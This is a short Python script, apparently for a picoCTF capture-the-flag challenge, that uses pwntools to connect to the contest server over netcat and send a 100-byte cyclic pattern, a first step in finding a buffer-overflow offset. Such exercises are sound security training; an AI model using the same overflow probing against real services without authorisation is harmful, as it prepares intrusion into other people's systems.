import pwn
pwn.context.log_level="WARN"
proc = pwn.process(argv=["nc saturn.picoctf.net 57331"], shell=True)

proc.sendline(pwn.cyclic(100))

print(proc.readline().decode().strip())
